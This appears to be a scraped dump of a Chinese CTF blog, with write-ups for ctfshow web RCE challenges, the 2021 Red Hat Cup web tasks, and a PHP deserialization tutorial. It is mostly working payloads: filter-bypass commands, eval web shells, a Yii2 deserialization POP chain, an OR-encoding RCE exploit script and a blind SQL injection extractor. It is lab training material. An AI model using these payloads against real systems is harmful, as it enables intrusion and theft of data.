/?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web37&lt;?php //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } payload： /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== /?c=data://text/palin,&lt;?php system(\"nl fla*\");?&gt; web38过滤了flag payload： /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== web39payload： /?c=data://text/palin,&lt;?php%20system(\"nl%20f*\");?&gt; web40理论上是异或 然后我懒 贴exp： import re content = '' preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/' for i in range(256): for j in range(256): if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)): k = i | j if k&gt;=32 and k&lt;=126: a = '%' + hex(i)[2:].zfill(2) b = '%' + hex(j)[2:].zfill(2) content += (chr(k) + ' '+ a + ' ' + b + '\\n') f = open('rce_or.txt', 'w') f.write(content) # -*- coding: utf-8 -*- import requests import urllib from sys import * import os os.system(\"php rce_or.php\") #没有将php写入环境变量需手动运行 if(len(argv)!=2): print(\"=\"*50) print('USER：python exp.py &lt;url&gt;') print(\"eg： python exp.py http://ctf.show/\") print(\"=\"*50) exit(0) url=argv[1] def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"rce_or.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\")) data={ 'c':urllib.parse.unquote(param) } r=requests.post(url,data=data) print(\"\\n[*] result:\\n\"+r.text) exp取自https://wp.ctf.show/d/137-ctfshow-web-web41/4 web41payload: /?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); web42/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃 %0a、%26、||截断 payload： /?c=nl%20*%0a = =姿势就不写那么多了 截断后看过滤自由发挥 web43过滤了;|cat payload： /?c=nl%20*%0a web44多过滤了个flag 通配符搞定 payload： /?c=nl%20*%0a web45空格被过滤了 payload： /?c=nl$IFS*%0a web46-49过滤了\\;|cat|flag| |[0-9]|\\\\$|\\*/ payload： /?c=nl%09fla\\g.php|| /?c=nl%09fla\\g.php%0a /?c=nl%09fla''g.php%0a /?c=nl%09fla\"\"g.php%0a /?c=vi%09fla\\g.php%0a /?c=tac%09fla\\g.php%0a /?c=uniq%09fla\\g.php%0a /?c=nl&lt;fla''g.php|| /?c=nl%09fla\\g.php%26 web50-51payload： /?c=nl&lt;fla%27%27g.php|| web52payload： /?c=nl${IFS}/fl\"\"ag%0a web53payload： /?c=nl${IFS}fla%''g.p''hp /?c=ca''t${IFS}fl?????? /?c=ca''t${IFS}fl''ag.p''hp 应该还有其他姿势 web54payload： /?c=mv${IFS}fla?.php${IFS}t.tx''t 爷给他改个名 /?c=/bin/?at${IFS}f??????? web55= = 只能是数字 对不起骚套路开始 payload： /?c=/???/????64+????.??? web56 https://blog.csdn.net/qq_46091464/article/details/108513145 数据包： POST /?c=.+/???/????????[@-[] HTTP/1.1 Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080 Content-Length: 329 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"file\"; filename=\"2.php\" Content-Type: application/octet-stream #!/bin/sh cat /var/www/html/flag.php ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"submit\" 111 ------WebKitFormBoundarydZeuVbMPZVcyvpNM-- ##web58 凑36 -37取反=36 payload： $((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_})))))))) ##web59 绕过disable_functions 我只想到一种 file可以把文件读取到一个数组，再打印出来 payload： c=var_dump(file('flag.php')); c=highlight_file(\"flag.php\"); c=show_source('flag.php'); ##web60-65 payload： c=highlight_file(\"flag.php\"); c=show_source('flag.php'); web66payload： c=var_dump(scandir(\"/\")); 扫描到flag 是txt 然后日他妈的 c=highlight_file('/flag.txt'); web67-70= = 好家伙 ban的真多 payload： c=include('/flag.txt'); c=require('/flag.txt'); c=require_once('/flag.txt'); web71ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()**之前调用ob_get_contents()，因为当调用ob_end_clean()**时缓冲区内容将被丢弃。 https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187 y4的blog说的很清楚 payload： c=include('/flag.txt');;exit(); web72 看一下y4的blog就可以了= = payload不贴了 太长了。 ##web73 c=?&gt;&lt;?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f-&gt;__toString().' '); } exit(0); ?&gt; 看一下目录 然后 payload： c=include('/flagc.txt');exit(); web74同73题 web75-76扫目录 c=$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0); mysql load_file读文件 c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');foreach($dbh-&gt;query('select load_file(\"/flag36.txt\")') as $row) {echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();exit(0);}exit(0); ##web77 不是很清楚这个题怎么做 但是我复现了一下 https://www.laruence.com/2020/03/11/5475.html https://blog.csdn.net/miuzzx/article/details/108619930","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it","slug":"[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T03:48:47.990Z","comments":true,"path":"posts/ce4e97fc.html","link":"","permalink":"http://h3geeker.top/posts/ce4e97fc.html","excerpt":"","text":"[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it看群里说CTFHub上复现了， 我来看看 本来想按照红帽杯的套路来试一下，发现phpinfo里莫得flag了 只能想想其他办法咯 &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; preg_match()过滤了eval但是！！！！！ Eval它没ban 所以我们可以写’大’马 构造payload： /?code=&lt;?php%20@Eval($_POST['aaa']);?&gt; 蚁剑连马 拿到flag： 但是作为菜鸡 我还是要重新思考一下这道题的思路： 代码中有几个函数需要注意一下 比如fopen(),fwrite(),fread() fread() 函数读取文件 $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); 也就是说，这里已经读到了flag $a=$_GET['code']; fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); 这里又都写到了hack.php 所以也就是说，我们再绕通配符写马的时候，flag也被传进了hack.php中 但是为什么看不到呢（具体我也不知道，知道的大哥哥可以告诉我学习一下） 但是我想到了另外一个函数show_source() show_source() 函数对文件进行语法高亮显示。 随机构造payload： /?code=&lt;?php show_source(__FILE__);?&gt; 也没有被ban的项，正常传入 然后访问hack.php flag他就出来了。。。。 同时还有我传入的payload 搞一波骚操作！ 所以，今天又学到了新姿势~~~~","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"2021红帽杯 web writeup","slug":"[2021红帽杯]Web writeup","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T03:48:32.298Z","comments":true,"path":"posts/fa671b36.html","link":"","permalink":"http://h3geeker.top/posts/fa671b36.html","excerpt":"","text":"find_it老套路扫一下目录 貌似只有君子协定有用，打开看看 When I was a child,I also like to read Robots.txt Here is what you want:1ndexx.php 打开1ndexx.php 发现打不开， 尝试一下是否有备份 /.1ndexx.php.swp 发现了一串代码： &lt;?php $link = mysql_connect('localhost', 'root'); ?&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body { background-color: white; text-align: center; padding: 50px; font-family: \"Open Sans\",\"Helvetica Neue\",Helvetica,Arial,sans-serif; } #logo { margin-bottom: 40px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img id=\"logo\" src=\"logo.png\" /&gt; &lt;h1&gt;&lt;?php echo \"Hello My freind!\"; ?&gt;&lt;/h1&gt; &lt;?php if($link) { ?&gt; &lt;h2&gt;I Can't view my php files?!&lt;/h2&gt; &lt;?php } else { ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php } ?&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; 构造payload： /?code=&lt;?php%20phpinfo();?&gt; 然后访问一下hack.php查看phpinfo 本来只是想指向探针看一下，没想到flag直接给了 framework打开发现是yii2反序列化 随即打开百度，来找一下复现： https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40 然后回到题目，按照常理我扫了一下网站目录，发现了www.zip“ ： 下载到本地发现正好是源码，就在本地搭建环境 丢进去phpstudy里，按照大佬的漏洞复现，在controllers下创建Controller.php 然后再新建个poc.php 在里面写： &lt;?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'assert'; $this-&gt;id = 'file_put_contents(\"/var/www/html/web/1.php\",\"&lt;?php eval(\\$_POST[111]);\");'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?&gt; 然后再生成一下payload 传进去： /index.php?r=site/about&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19 一开始，传进去看到这个报错，以为没有成功，后来访问了一下1.php发现自己成功了QAQ 打开蚁剑，直接连上马： 看了一圈发现flag再根目录： 然后发现没有权限。。。。。。。又卡住了 但是我做题晚上刚刚复现了蓝帽的web题，有disable_functions绕过插件，就去试了一下 然后试着读了一下 它就出来了！！！！！！！ #WebsiteManger 是一道注入题 跑了一下sqlmap 发现了两个参数： username password 和/image.php下的id 注入了一下发现前两个都不是，随即对id下手 尝试了几种注入都无效，最后发现是异或注入 构造payload： /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1 有回现，尝试变更参数 直到： /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1 时没有回显，证明数据库第一位是c 获取第二位： /image.php?id=1^(ascii(substr((select(database())),2,1))&gt;1)^1 发现到117没有回显 证明第二位为t 依次类推，获得第三位为f 当数据库位数为4位时始终没有回显。证明只有三位，且数据库名为ctf 知道了数据库名就好办了，直接起脚本，依次爆）： import requests import time url = \"http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))&gt;{1})^1\" word=\"\" for i in range(1,1000): l = 32 h = 128 mid = (l + h) while (l &lt; h): nurl=url.format(i,mid) r=requests.get(url=nurl) if 'JFIF' in r.text: l = mid + 1 else: h = mid mid = (l + h) // 2 time.sleep(0.1) word += chr(mid) print(word) print(word) 获得表名为 users 之后依次修改url 继续 爆破 最终爆破出来密码为（当前环境下的密码）： 然后登录管理员账号： 抓包查看发现是ssrf 读取文件漏洞 构造payload： file:// /flag 获得flag #hpcurve 是一道原题 原题地址：https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ ebcdic编码转换成ascii编码 使用DD命令去操作，Linux命令 得到flag","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"PHP反序列化漏洞基础","slug":"PHP反序列化漏洞基础","date":"2021-11-10T13:35:22.000Z","updated":"2022-01-05T08:34:59.970Z","comments":true,"path":"posts/ae3250a1.html","link":"","permalink":"http://h3geeker.top/posts/ae3250a1.html","excerpt":"","text":"PHP序列化与序列化作者：H3h3QAQ 本文首发在 一、PHP序列化和反序列化1.PHP反序列化：serialize() 将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构 常见的序列化字母表示及其含义： a - array -----&gt;a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;...&lt;key n&gt;&lt;value n&gt;} b - boolean -----&gt;b:&lt;digit&gt; d - double -----&gt;d:&lt;number&gt; i - integer -----&gt;i:&lt;number&gt; o - common r - reference s - string -----&gt;s:&lt;length&gt;:\"&lt;value&gt;\" C - custom object O - class -----&gt;O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value1&gt;...&lt;field name n&gt;&lt;field value n&gt;} N - null R - pointer reference U - unicode string &lt;?php class h3{ public $v1; public $v2=false; public $v3=1; public $v4=2.1; public $v5=array(); public $v6=\"h3h3QAQ\"; private $v7=\"H3h3QAQ\"; protected $v8=\"protected\"; } $s=serialize(new h3()); echo $s; var_dump(unserialize($s)); 序列化运行结果为： O:2:\"h3\":8:{s:2:\"v1\";N;s:2:\"v2\";b:0;s:2:\"v3\";i:1;s:2:\"v4\";d:2.1;s:2:\"v5\";a:0:{}s:2:\"v6\";s:7:\"h3h3QAQ\";s:6:\" h3 v7\";s:7:\"H3h3QAQ\";s:5:\" * v8\";s:9:\"protected\";} 反序列化运行结果 object(h3)#1 (8) { [\"v1\"]=&gt; NULL [\"v2\"]=&gt; bool(false) [\"v3\"]=&gt; int(1) [\"v4\"]=&gt; float(2.1) [\"v5\"]=&gt; array(0) { } [\"v6\"]=&gt; string(7) \"h3h3QAQ\" [\"v7\":\"h3\":private]=&gt; string(7) \"H3h3QAQ\" [\"v8\":protected]=&gt; string(9) \"protected\" } （1）各种魔术方法__destruct()：//析构函数当对象被销毁时会被自动调用 __wakeup(): //unserialize()时会被自动调用 __invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用 __call(): //在对象上下文中调用不可访问的方法时触发 __callStatci(): //在静态上下文中调用不可访问的方法时触发 __get(): //用于从不可访问的属性读取数据 __set(): //用于将数据写入不可访问的属性 __isset(): //在不可访问的属性上调用isset()或empty()触发 __unset(): //在不可访问的属性上使用unset()时触发 __toString(): //把类当作字符串使用时触发 __construct(): //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 __sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用 当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124） （2）PHP反序列化特性1.PHP在反序列化时，底层代码时以;作为字段的分隔，以}作为结尾（字符串除外），并且是根据长度判断内容的。 2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。 3.对类中不存在的属性也会进行反序列化。 2.session反序列化（1）session概念PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。 （2）会话过程当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项session.auto_start设置为1，那么请求开始的时候，会话会自动开始 PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话 （3）存储引擎PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项session.save_handler来进行确定的，默认是以文件的方式储存。储存的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值得序列化之后得内容。 session.serialize_handler有如下三种取值： &lt;?php error_reporting(0); in_set('session.serialize_handeler','php_binary');//这里可以换不同的存储引擎 session_start(); $_SESSION['username']=$_GET['username']; ?&gt; 每种存储引擎存储的内容格式： 3.phar反序列化phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞 phar文件的结构： -stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件 -manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点 -contents：压缩文件的内容 -signature：签名，在文件末尾 生成phar文件 一定要将php.ini中的phar.readonly选项设置为Off &lt;?php class h3{ } @unlink(\"phar.phar\"); $phar= new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php__HALT_COMPILER();?&gt;\");//设置stub，添加gif文件头 $o=new h3(); $phar-&gt;setMetadata($o);//将自定义meat-data存入manifest $phar-&gt;addFromString(\"test.txt\",\"test\");//添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt; ##二、反序列化漏洞 1.反序列化成因主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作 （1）phar反序列化漏洞造成原因漏洞出发点在使用phar://协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞 2.反序列化漏洞（1）PHP反序列化漏洞&lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们可以简单的分析一下代码 定义了一个class类，类中有两个私有变量method和args 有三个魔术方法： function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() //析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } 分析代码段中host的来源，想办法利用system()构成RCE &lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct()//析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们观察代码可知： GET方法获取参数a，并且将其反序列化。 但是再执行反序列化的时候，会自动调用__wakeup()魔术方法，把args的值改为127.0.0.1 无论我们怎么构造payload，system()执行的命令都是ping -c 2 127.0.0.1 这时我们可以利用到CVE-2016-7124漏洞 适用版本： PHP5&lt;5.6.25、PHP7&lt;7.0.1 当成员属性数目大于实际数码时可绕过__wakeup方法 就可以构造恶意payload来RCE 这里还有个小知识点|管道符 把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。 所以我们可以构造序列化了 &lt;?php class home{ private $method=\"ping\"; private $args=array(\"|calc\"); } serialize(new home()); O:4:\"home\":2:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} 需要跳一下__wakeup()把成员属性数目改为3 O:4:\"home\":3:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} URL编码一下 O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D 成功RCE （2）session反序列化漏洞当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击 例子： phpinfo： s1.php： &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(\"session.serialize_handler\",'php_serialize'); session_start(); $_SESSION[\"h3\"]=$_GET[\"u\"]; ?&gt; s2.php： &lt;?php highlight_file(__FILE__); session_start(); class session{ var $var; function __destruct(){ eval($this-&gt;var); } } ?&gt; 这里需要说一下unserialize的特性，在执行unserialize的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略 a:1:{s:2:\"h3\";s:52:\"|O:7:\"session\":1:{s:3:\"var\";s:15:\"system('calc');\";}\";} exp： &lt;?php class session{ var $var=\"system('calc');\"; } echo \"|\".serialize(new session()); 执行结果: 上文可以给$_SESSION赋值，若代码中不存在给$_SESSION赋值可以利用uplode_process机制，可以在$_SESSION中创建一个键值对，其中的值可以控制 &lt;?php $key=ini_get(\"session.upload_progress.prefix\") . ini_get(\"session.upload_progress.name\"); var_dump($_SESSION[$key]); ?&gt; （3）phar反序列化利用条件： -phar文件能够上传到服务器 -要有可用的魔术方法作为“跳板” -文件操作函数的参数可控，且：/ \\ 等特殊字符没有被过滤 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下 例题:[SWPUCTF 2018]SimplePHP 存在任意文件读取 先来读取一下upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; 再来读取一下function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; 再读取一下base.php 发现了提示 回头再来看class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; 在Test类中存在敏感操作 public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } 可以反向推poc链 通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知__get-&gt;get-&gt;file_get，所以关键是触发__get方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法 class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", 